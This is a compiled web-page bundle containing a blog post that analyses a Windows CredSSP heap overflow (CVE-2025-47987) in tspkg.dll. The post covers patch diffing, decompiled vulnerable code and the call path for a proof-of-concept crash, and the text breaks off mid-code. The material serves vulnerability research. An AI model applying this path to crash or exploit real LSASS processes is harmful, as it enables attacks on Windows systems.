p=L(s);l&&l.l(p),p.forEach(n),this.h()},h(){m(s,"class","block w-full")},m(t,p){F(t,s,p),l&&l.m(s,null),e=!0},p(t,p){l&&l.p&&(!e||p&16)&&On(l,a,t,t[4],e?Un(a,t[4],p,null):Nn(t[4]),null)},i(t){e||($(l,t),e=!0)},o(t){B(l,t),e=!1},d(t){t&&n(s),l&&l.d(t)}}}function xa(i){let s,e,a,l,t,p,h,v,b;function T(D,x){return D[2]==="success"?Sa:D[2]==="warning"?ka:D[2]==="error"?Ca:Aa}let R=T(i),C=R(i),w=i[1]&&Pe(i),k=i[3].default&&Re(i);return{c(){s=d("div"),e=d("div"),C.c(),a=f(),l=d("div"),t=d("div"),p=Mn(i[0]),h=f(),w&&w.c(),v=f(),k&&k.c(),this.h()},l(D){s=y(D,"DIV",{class:!0});var x=L(s);e=y(x,"DIV",{class:!0});var P=L(e);C.l(P),a=u(P),l=y(P,"DIV",{});var A=L(l);t=y(A,"DIV",{style:!0});var _=L(t);p=xn(_,i[0]),_.forEach(n),h=u(A),w&&w.l(A),A.forEach(n),P.forEach(n),v=u(x),k&&k.l(x),x.forEach(n),this.h()},h(){qs(t,"font-size","20px"),z(t,"font-bold",i[1]),m(e,"class","mr-auto flex items-center space-x-3"),m(s,"class","alert flex-col shadow-inner my-4"),z(s,"alert-error",i[2]==="error"),z(s,"alert-info",i[2]==="info"),z(s,"alert-success",i[2]==="success"),z(s,"alert-warning",i[2]==="warning")},m(D,x){F(D,s,x),M(s,e),C.m(e,null),M(e,a),M(e,l),M(l,t),M(t,p),M(l,h),w&&w.m(l,null),M(s,v),k&&k.m(s,null),b=!0},p(D,[x]){R!==(R=T(D))&&(C.d(1),C=R(D),C&&(C.c(),C.m(e,a))),(!b||x&1)&&Sn(p,D[0]),(!b||x&2)&&z(t,"font-bold",D[1]),D[1]?w?w.p(D,x):(w=Pe(D),w.c(),w.m(l,null)):w&&(w.d(1),w=null),D[3].default?k?(k.p(D,x),x&8&&$(k,1)):(k=Re(D),k.c(),$(k,1),k.m(s,null)):k&&(te(),B(k,1,1,()=>{k=null}),pe()),(!b||x&4)&&z(s,"alert-error",D[2]==="error"),(!b||x&4)&&z(s,"alert-info",D[2]==="info"),(!b||x&4)&&z(s,"alert-success",D[2]==="success"),(!b||x&4)&&z(s,"alert-warning",D[2]==="warning")},i(D){b||($(k),b=!0)},o(D){B(k),b=!1},d(D){D&&n(s),C.d(),w&&w.d(),k&&k.d()}}}function Ma(i,s,e){let{$$slots:a={},$$scope:l}=s;const t=Ve(a);let{title:p}=s,{description:h}=s,{status:v}=s;return i.$$set=b=>{"title"in b&&e(0,p=b.title),"description"in b&&e(1,h=b.description),"status"in b&&e(2,v=b.status),"$$scope"in b&&e(4,l=b.$$scope)},[p,h,v,t,l,a]}class $a extends us{constructor(s){super(),fs(this,s,Ma,xa,hs,{title:0,description:1,status:2})}}function Ha(i){let s,e="<tr><th><strong><em>User-mode</em></strong></th> <th><strong><em>Kernel-mode</em></strong></th></tr>",a,l,t="<tr><td>The <strong>Local Security Authority</strong> (LSA/lsass.exe) is a user-mode process that acts as a security policy enforcer. It receives credentials from Winlogon or Credential Provider, packages them and sends them to the appropriate authentication package(e.g Kerberos, NTLM) in kernel-mode. It also ensures that the credential format is correct before passing it down.</td> <td>In kernel, credentials are validated by the Kerberos, NTLM or other authentication providers. The actual validation (e.g. ticket generation, password hashing) is done here.</td></tr>";return{c(){s=d("thead"),s.innerHTML=e,a=f(),l=d("tbody"),l.innerHTML=t},l(p){s=y(p,"THEAD",{"data-svelte-h":!0}),E(s)!=="svelte-1wvqf93"&&(s.innerHTML=e),a=u(p),l=y(p,"TBODY",{"data-svelte-h":!0}),E(l)!=="svelte-1f0pijk"&&(l.innerHTML=t)},m(p,h){F(p,s,h),F(p,a,h),F(p,l,h)},p:Hs,d(p){p&&(n(s),n(a),n(l))}}}function Ba(i){let s,e="Hello reader, this blog post will be about a vulnerability in Windows which was publicly announced last month as part of the  July 8th patch update. The vulnerable component is part of the client authentication mechanism. To begin, let’s take a high-level look at how this component works.",a,l,t='<a href="#client-authentication-architecture">Client Authentication Architecture</a>',p,h,v="In Windows, the authentication happens in 2 layers, user-mode and kernel-mode.",b,T,R,C,w,k,D,x=`The <strong>CredSSP</strong> protocol is part of this authentication architecture and allows applications to securely delegate user credentials from a client to a server for remote authentication.
For example, RDP protocol uses <strong>CredSSP</strong> protocol for preparing the client-supplied credentials when authenticating to a server, as seen in the image below (first stage). This aspect of the authentication flow will be important when discussing the vulnerability details.`,P,A,_,H,j,O='<a href="#root-cause">Root Cause</a>',S,I,as='According to <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47987%E2%80%8B" rel="nofollow noopener noreferrer external" target="_blank">Microsoft update website</a>, the vulnerability results from a chain of 2 bugs:',Ks,J,ms="<li>Integer overflow</li> <li>Heap-based buffer overflow</li>",gs,_s,Qs=`Microsoft also mentions that the weakness resides in a component which is part of the CredSSP protocol. Through patch diffing technique, an interesting finding was observed in the <code>tspkg.dll</code> driver. The full module name is <strong>Terminal Services Security Package</strong> and it implements the <strong>TS(Terminal Services)</strong> authentication protocol, which is used for RDP authentication.
This driver is a suitable candidate for this CVE because it is used to prepare the RDP credentials before sending them to the server.`,Bl,Es,Ys,fl,El="This is the interesting function:",bs,bl,wn=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> __fastcall </span><span style="color: #A6E22E">TSCreateKerbCertLogonBuffer</span><span style="color: #F8F8F2">(</span></div><div class='line dim'><span style="color: #F8F8F2">    UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">password</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">domain</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">username</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">a4</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">size_t</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">certLen</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">**</span><span style="color: #FD971F">a6</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">a7</span><span style="color: #F8F8F2">)</span></div><div class='line dim'><span style="color: #F8F8F2">&#123;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> totalLength;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> alignedTotalLength;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> __totalLength;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> _Size;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">size_t</span><span style="color: #F8F8F2"> _totalLength;</span></div><div class='line dim'><span style="color: #F8F8F2">    ... </span><span style="color: #88846F">// other variables declaration</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Initial setup</span></div><div class='line dim'><span style="color: #F8F8F2">    src </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> a4;</span></div><div class='line dim'><span style="color: #F8F8F2">    totalLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (domain-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> password-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> username-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">93</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">FFFFFFF8</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    _totalLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> totalLength;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    _Size </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> certLen;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Feature flag check</span></div><div class='line highlight'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (isEnabled)</span></div><div class='line highlight'><span style="color: #F8F8F2">    &#123;</span></div><div class='line highlight'><span style="color: #F8F8F2">        status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">RtlULongAdd</span><span style="color: #F8F8F2">(totalLength, certLen, (</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)</span><span style="color: #F92672">&</span><span style="color: #F8F8F2">_totalLength);</span></div><div class='line highlight'><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (status </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">)</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2">)status;</span></div><div class='line'></div><div class='line highlight'><span style="color: #F8F8F2">        __totalLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2">)_totalLength;</span></div><div class='line highlight'><span style="color: #F8F8F2">    &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">else</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">        __totalLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> totalLength </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> certLen;</span></div><div class='line dim'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Allocate memory for the buffer</span></div><div class='line dim'><span style="color: #F8F8F2">    buff </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSAllocate</span><span style="color: #F8F8F2">(__totalLength);</span></div><div class='line dim'><span style="color: #F8F8F2">    _buff </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> buff;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (</span><span style="color: #F92672">!</span><span style="color: #F8F8F2">buff)</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000009A</span><span style="color: #F8F8F2">;   </span><span style="color: #88846F">// STATUS_INSUFFICIENT_RESOURCES</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Fill in header</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)buff </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">13</span><span style="color: #F8F8F2">;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    currentPtr   </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">80</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    passwordBuf  </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">void</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">80</span><span style="color: #F8F8F2">);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Password</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">40</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> password-&gt;Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    length </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> password-&gt;Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(QWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">48</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">80</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">42</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(passwordBuf, password-&gt;Buffer, password-&gt;Length);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Domain</span></div><div class='line dim'><span style="color: #F8F8F2">    domainBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">short</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">42</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> currentPtr);</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">8</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> domain-&gt;Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> domain-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(QWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">16</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">domainBuf[</span><span style="color: #F92672">-</span><span style="color: #F8F8F2">_buff];</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(domainBuf, domain-&gt;Buffer, domain-&gt;Length);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Username</span></div><div class='line dim'><span style="color: #F8F8F2">    usernameBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">domainBuf[</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">short</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span><span style="color: #F8F8F2">)];</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">24</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> username-&gt;Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(WORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">26</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> username-&gt;Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(QWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">32</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">usernameBuf[</span><span style="color: #F92672">-</span><span style="color: #F8F8F2">_buff];</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(usernameBuf, username-&gt;Buffer, username-&gt;Length);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Certificate</span></div><div class='line dim'><span style="color: #F8F8F2">    certBuf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(</span></div><div class='line dim'><span style="color: #F8F8F2">        (</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2">)</span><span style="color: #F92672">&</span><span style="color: #F8F8F2">usernameBuf[</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">short</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">26</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7</span><span style="color: #F8F8F2">]</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">FFFFFFFFFFFFFFF8</span><span style="color: #F92672">ULL</span></div><div class='line dim'><span style="color: #F8F8F2">    );</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">60</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> _Size;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">(QWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(_buff </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">64</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">certBuf[</span><span style="color: #F92672">-</span><span style="color: #F8F8F2">_buff];</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(certBuf, src, _Size);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Output</span></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> status;</span></div><div class='line dim'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre>`,es,Zs,Il="The highlighted section shows the patched code. The use of the <code>RtlULongAdd</code> function strongly suggests that the original, vulnerable version was susceptible to integer overflow. Later in the function, the result of this calculation, potentially overflowed, is used to allocate a heap object and perform copy operations, which could lead to buffer overflow. It is safe to assume that this is the vulnerable function since it matches the MS description for CVE-2025-47987.",ws,Bs,Pl='<a href="#building-a-poc-crash">Building a PoC Crash</a>',Xs,hl,wl="In order to identify the entry point into the <code>tspkg.dll</code> driver, a good approach is to start from the vulnerable function and trace back the function from which it was called. Then, repeat the same step up until the entry function is reached inside the driver. This is the list of functions which are the most relevant for the vulnerability:",Ds,Js,Rl="<li><code>SpAcquireCredentialsHandle</code> <ul><li><code>TSCaptureSuppliedCreds</code></li> <li><code>TSUnpackKerbCertLogonBuffer</code> <ul><li><code>TSInitCertCreds</code> <ul><li><code>TSGetCspDetailFromCspData</code> <ul><li><code>TSRelocateCspString</code></li></ul></li> <li><strong>TSCreateKerbCertLogonBuffer</strong></li></ul></li></ul></li></ul></li>",Is,ss,Ol="When the PoC binary calls the <code>AcquireCredentialsHandle</code> WinAPI function, the SSPI module forwards the request to the <code>lsass.exe</code> process. <code>lsass.exe</code> then routes the request to the appropriate security package driver—in this case, <code>tspkg.dll</code>—where the <code>SpAcquireCredentialsHandle</code> function is invoked. The credential flow for a RDP connection where <code>tspkg.dll</code> is invoked can be seen in the image below.",Ls,Dl,Dn=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #F8F8F2">RDP Client</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">|</span></div><div class='line'><span style="color: #F8F8F2">    v</span></div><div class='line'><span style="color: #F8F8F2">Terminal Services Service (calls SSPI with </span><span style="color: #E6DB74">"TSSSP"</span><span style="color: #F8F8F2">)</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">|</span></div><div class='line'><span style="color: #F8F8F2">    v</span></div><div class='line'><span style="color: #F8F8F2">SSPI </span><span style="color: #E6DB74">"TSSSP"</span><span style="color: #F8F8F2"> package (user mode)</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">|</span></div><div class='line'><span style="color: #F8F8F2">    v</span></div><div class='line'><span style="color: #F8F8F2">Communicates with LSASS process</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">|</span></div><div class='line'><span style="color: #F8F8F2">    v</span></div><div class='line'><span style="color: #F8F8F2">LSASS dispatches to LSA package </span><span style="color: #E6DB74">"tspkg.dll"</span><span style="color: #F8F8F2"> (SpAcquireCredentialsHandle)</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">|</span></div><div class='line'><span style="color: #F8F8F2">    v</span></div><div class='line'><span style="color: #E6DB74">&#96;tspkg.dll&#96;</span><span style="color: #F8F8F2"> handles credentials inside LSASS (SYSTEM)</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">|</span></div><div class='line'><span style="color: #F8F8F2">    v</span></div><div class='line'><span style="color: #F8F8F2">RDP session proceeds</span></div></code></div></pre>`,os,sl,Nl="The Poc binary calls <code>AcquireCredentialsHandle</code> with the following parameters:",ts,Ll,Ln=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line'><span style="color: #A6E22E">AcquireCredentialHandleW</span><span style="color: #F8F8F2">(</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #AE81FF">NULL</span><span style="color: #F8F8F2">,</span></div><div class='line'><span style="color: #F8F8F2">    (LPWSTR)L</span><span style="color: #E6DB74">"TSSSP"</span><span style="color: #F8F8F2">,   </span><span style="color: #88846F">// pszPackage (name of the security package)</span></div><div class='line'><span style="color: #F8F8F2">    SECPKG_CRED_OUTBOUND,</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #AE81FF">NULL</span><span style="color: #F8F8F2">,</span></div><div class='line'><span style="color: #F8F8F2">    buf,                </span><span style="color: #88846F">// pAuthData (pointer to authentication data)</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #AE81FF">NULL</span><span style="color: #F8F8F2">,</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #AE81FF">NULL</span><span style="color: #F8F8F2">,</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">&</span><span style="color: #FD971F">credHandle</span><span style="color: #F8F8F2">,</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">expiry</span></div><div class='line'><span style="color: #F8F8F2">);</span></div></code></div></pre>`,ps,Ps,Ul='<a href="#reaching-tsinitcertcreds">Reaching TSInitCertCreds()</a>',Y,ll,Wl="Inside <code>tspkg.dll</code>, <code>SpAcquireCredentialsHandle</code> function will call <code>TSCaptureSuppliedCreds</code> without any restrictions for the user-supplied buffer. When trying to reach <code>TSInitCertCreds</code>, there are some validations to ensure that the credential buffer received follows a required format.",Ts,Tl,Tn=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> __fastcall </span><span style="color: #A6E22E">TSCaptureSuppliedCreds</span><span style="color: #F8F8F2">(</span></div><div class='line dim'><span style="color: #F8F8F2">    LUID </span><span style="color: #F92672">*</span><span style="color: #FD971F">a1</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">void</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">a2</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    TS_PRIMARY_CREDENTIAL </span><span style="color: #F92672">**</span><span style="color: #FD971F">a3</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">a4</span><span style="color: #F8F8F2">)</span></div><div class='line dim'><span style="color: #F8F8F2">&#123;</span></div><div class='line dim'><span style="color: #F8F8F2">    ... </span><span style="color: #88846F">// Variables definition</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Get LSA call info</span></div><div class='line dim'><span style="color: #F8F8F2">    ((</span><span style="color: #66D9EF">void</span><span style="color: #F8F8F2"> (__fastcall </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: 